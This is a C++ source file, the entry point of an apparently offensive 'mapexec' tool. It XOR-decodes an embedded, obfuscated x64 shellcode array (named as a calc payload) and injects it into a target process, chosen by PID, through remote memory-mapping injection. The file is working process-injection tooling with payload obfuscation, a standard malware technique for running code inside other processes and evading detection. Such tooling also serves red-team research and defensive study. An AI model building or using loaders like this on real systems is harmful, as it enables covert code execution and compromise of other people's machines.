/**
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Notes : Base entry point for mapexec project.
 */

#include "global.hpp"

//input keys.
unsigned char xor_input_key[] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05
};

//Obfuscated payload (XOR) => make sure to encode your payload with correct key & use this same key for decoding.
unsigned char CalcObfuscatedXor[] = {
    0xFC, 0x49, 0x81, 0xE7, 0xF4, 0xED, 0xC0, 0x01, 
    0x02, 0x03, 0x45, 0x54, 0x41, 0x51, 0x50, 0x52, 
    0x52, 0x4D, 0x31, 0xD3, 0x67, 0x4B, 0x8F, 0x57, 
    0x60, 0x49, 0x89, 0x51, 0x1C, 0x4D, 0x8B, 0x53, 
    0x22, 0x4B, 0x8F, 0x77, 0x50, 0x49, 0x0D, 0xB4, 
    0x4E, 0x4F, 0x4D, 0x30, 0xCB, 0x4B, 0x35, 0xC5, 
    0xAC, 0x3D, 0x63, 0x7F, 0x06, 0x29, 0x20, 0x40, 
    0xC3, 0xCA, 0x09, 0x44, 0x01, 0xC0, 0xE0, 0xEE, 
    0x56, 0x44, 0x51, 0x49, 0x89, 0x51, 0x24, 0x8E, 
    0x42, 0x3D, 0x4A, 0x02, 0xD4, 0x8E, 0x80, 0x89, 
    0x02, 0x03, 0x04, 0x4D, 0x85, 0xC1, 0x76, 0x64, 
    0x4C, 0x04, 0xD0, 0x51, 0x89, 0x4B, 0x1C, 0x41, 
    0x8B, 0x41, 0x22, 0x4A, 0x05, 0xD5, 0xE3, 0x57, 
    0x4A, 0xFC, 0xCD, 0x44, 0x8B, 0x35, 0x8A, 0x4B, 
    0x05, 0xD3, 0x4D, 0x30, 0xCB, 0x4B, 0x35, 0xC5, 
    0xAC, 0x40, 0xC3, 0xCA, 0x09, 0x44, 0x01, 0xC0, 
    0x3A, 0xE3, 0x71, 0xF4, 0x4C, 0x02, 0x4E, 0x27, 
    0x0C, 0x40, 0x39, 0xD0, 0x77, 0xDB, 0x5C, 0x41, 
    0x8B, 0x41, 0x26, 0x4A, 0x05, 0xD5, 0x66, 0x40, 
    0x89, 0x0F, 0x4C, 0x41, 0x8B, 0x41, 0x1E, 0x4A, 
    0x05, 0xD5, 0x41, 0x8A, 0x06, 0x8B, 0x4C, 0x04, 
    0xD0, 0x40, 0x5A, 0x42, 0x5C, 0x5B, 0x59, 0x5B, 
    0x43, 0x5B, 0x45, 0x5C, 0x41, 0x5B, 0x4A, 0x80, 
    0xE8, 0x25, 0x41, 0x53, 0xFD, 0xE3, 0x5C, 0x44, 
    0x59, 0x5B, 0x4A, 0x88, 0x16, 0xEC, 0x57, 0xFE, 
    0xFD, 0xFC, 0x59, 0x4D, 0xBA, 0x00, 0x02, 0x03, 
    0x04, 0x05, 0x00, 0x01, 0x02, 0x4B, 0x89, 0x88, 
    0x01, 0x00, 0x02, 0x03, 0x45, 0xBF, 0x31, 0x8A, 
    0x6D, 0x84, 0xFB, 0xD0, 0xBB, 0xE1, 0x1F, 0x29, 
    0x0E, 0x44, 0xBA, 0xA7, 0x97, 0xBE, 0x99, 0xFA, 
    0xD5, 0x49, 0x81, 0xC7, 0x2C, 0x39, 0x06, 0x7D, 
    0x08, 0x83, 0xFF, 0xE5, 0x75, 0x04, 0xB9, 0x44,
    0x17, 0x77, 0x6F, 0x6B, 0x02, 0x5A, 0x45, 0x8C,
    0xDA, 0xFE, 0xD7, 0x60, 0x65, 0x69, 0x63, 0x01,
};

/**
 * ENTRY POINT.
 */
int main(int argc, char *argv[]){
    DWORD PID      = 0;

    if(argc != 2){
        printf("[!] ERROR : must pass <PID> in param... \n");
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    XorByInputKeys(CalcObfuscatedXor, sizeof(CalcObfuscatedXor), xor_input_key, sizeof(xor_input_key));

    // SHOW PAYLOAD (ORIGINAL)
    // PrintHexData("shellcode_x64", CalcObfuscatedXor, sizeof(CalcObfuscatedXor));
    // printf("[*] PRESS <ENTER> to continue...\n");
    // getchar();
    // -------------------------------------------------

    if(!RemoteMappingInjection(PID, CalcObfuscatedXor, sizeof(CalcObfuscatedXor))){
        printf("[!] Error executing mapexec with PID : %lu \n", PID);
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}